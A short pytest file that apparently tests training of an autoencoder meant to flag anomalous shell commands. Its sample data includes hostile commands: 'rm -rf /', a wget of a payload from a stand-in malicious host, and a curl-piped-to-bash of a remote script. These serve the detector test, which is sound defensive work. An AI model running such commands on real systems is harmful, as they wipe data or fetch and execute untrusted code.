import pytest
import torch

from cyanide.ml.model import CommandAutoencoder

pytest.importorskip("torch")


def test_model_fit():
    """Test the new incremental training (fit) method."""
    model = CommandAutoencoder(input_dim=64, latent_dim=16)
    initial_weights = model.encoder[0].weight.clone()

    commands = [
        "ls -la",
        "cd /tmp",
        "rm -rf /",
        "wget http://malicious.com/payload",
        "curl http://1.2.3.4/sh | bash",
    ]

    loss = model.fit(commands, epochs=2, batch_size=2)

    assert loss > 0
    assert not torch.equal(model.encoder[0].weight, initial_weights)
    assert model.training is False
